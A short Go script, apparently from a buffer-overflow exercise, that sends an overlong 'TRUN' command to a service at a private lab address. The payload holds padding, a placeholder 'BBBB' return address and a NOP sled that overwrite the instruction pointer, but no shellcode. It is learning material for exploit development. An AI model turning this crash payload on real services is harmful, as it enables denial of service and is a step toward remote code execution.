package main

import (
    "fmt"
    "net"
    "strings" //Gives me ability to repeat a string
 )
 
 func main() {
 
    fmt.Println("[*] Connecting to Target")
    
    conn, err := net.Dial("tcp", "192.168.56.101:9999")
    if err != nil {
        fmt.Println("[!] There was an error connecting")
        fmt.Println("=====================================")
        fmt.Println(err)
        return
    }
    
    fuzz1 := strings.Repeat("A", 2006)
    eip := "BBBB"
    nopSled := strings.Repeat("\x90", 16)
    padding := strings.Repeat("C", 974)
    
    payload := "TRUN ." + fuzz1 + eip + nopSled + padding
    
    fmt.Fprintf(conn, payload)
    conn.Close()
    
 }
